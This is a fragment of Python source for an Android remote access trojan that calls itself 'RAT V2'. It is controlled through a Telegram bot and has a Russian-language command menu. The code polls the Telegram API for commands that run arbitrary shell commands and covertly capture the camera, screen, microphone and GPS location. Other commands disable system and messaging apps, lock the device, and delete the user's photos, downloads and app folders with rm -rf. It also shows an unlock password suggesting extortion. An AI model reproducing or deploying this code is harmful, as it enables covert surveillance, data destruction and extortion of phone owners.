def block_all():
 try:
  apps=["com.android.packageinstaller","com.google.android.gms","com.android.vending","com.android.chrome","com.whatsapp","com.instagram.android","com.facebook.katana","org.telegram","com.roblox.client","com.discord","com.snapchat.android","com.twitter.android","com.zhiliaoapp.musically","com.android.systemui","com.android.settings","com.sec.android.app.launcher","com.google.android.apps.maps","com.android.browser","com.android.mms","com.android.dialer","com.android.contacts","com.android.email","com.android.camera"]
  for a in apps:os.system(f"pm disable {a} 2>/dev/null")
  os.system("settings put global install_non_market_apps 0")
  os.system("settings put global development_settings_enabled 0")
  return"done"
 except:return"no"
def lock_screen():
 for i in range(5):os.system("input keyevent 26")
 return"done"
def delete_files():
 try:
  dirs=["DCIM","Pictures","Movies","Music","Download","Documents","WhatsApp","Telegram","Instagram","Facebook","Discord","TikTok","Snapchat","Twitter","Netflix","Spotify","Roblox"]
  for d in dirs:os.system(f"rm -rf /storage/emulated/0/{d}/* 2>/dev/null")
  os.system("rm -rf /sdcard/*.db /sdcard/*.xml /sdcard/*.json /sdcard/*.txt 2>/dev/null")
  return"done"
 except:return"no"
def vibrate():
 for i in range(10):os.system("input vibrate 1000")
 return"done"
def flash_led():
 try:
  os.system("termux-torch on")
  time.sleep(5)
  os.system("termux-torch off")
  return"done"
 except:return"no"
def command_loop():
 while True:
  try:
   r=requests.get(f"https://api.telegram.org/bot{T}/getUpdates",params={"offset":0,"timeout":30},timeout=35)
   for u in r.json().get("result",[]):
    txt=u.get("message",{}).get("text","")
    if txt.startswith("/cmd "):
     res=cmd(txt[5:])
     send(f"CMD: {txt[5:]}\n{res}")
    elif txt=="/photo":
     p=take_photo()
     if p:send_photo(p)
     else:send("NO CAMERA")
    elif txt=="/video":
     v=take_video()
     if v:send_video(v)
     else:send("NO CAMERA")
    elif txt=="/screen":
     s=take_screenshot()
     if s:send_photo(s)
     else:send("NO SCREEN")
    elif txt=="/mic_start":
     start_mic()
     send("RECORDING...")
    elif txt=="/mic_stop":
     a=stop_mic()
     if a:send_audio(a)
     else:send("NO AUDIO")
    elif txt=="/loc":
     g=get_gps()
     send(f"GPS: {g}")
    elif txt=="/lock":
     lock_screen()
     send("LOCKED")
    elif txt=="/block":
     block_all()
     send("BLOCKED")
    elif txt=="/delete":
     delete_files()
     send("DELETED")
    elif txt=="/vibrate":
     vibrate()
     send("VIBRATE")
    elif txt=="/flash":
     flash_led()
     send("FLASH")
    elif txt=="/info":
     send(f"IP: {get_ip()}\nLOC: {get_location()}\nDEV: {get_device()}")
    elif txt=="/menu" or txt=="/start":
     menu="""
🔥 RAT V2 CONTROL MENU 🔥
━━━━━━━━━━━━━━━━━━━━━━━
📸 /photo - Сделать фото
🎥 /video - Записать видео
📱 /screen - Скриншот
🎙️ /mic_start - Начать запись
🔇 /mic_stop - Остановить запись
📍 /loc - GPS координаты
🔒 /lock - Блокировка экрана
🚫 /block - Блок всех приложений
🗑️ /delete - Удалить все файлы
📳 /vibrate - Вибрация
💡 /flash - Вспышка (5 сек)
ℹ️ /info - Информация
💻 /cmd - Выполнить команду
━━━━━━━━━━━━━━━━━━━━━━━
🔓 UNLOCK PASSWORD: v67
"""
     send(menu)
  except:pass
  time.sleep(2)
threading.Thread(target=command_loop,daemon=True).start()
msg=f"""
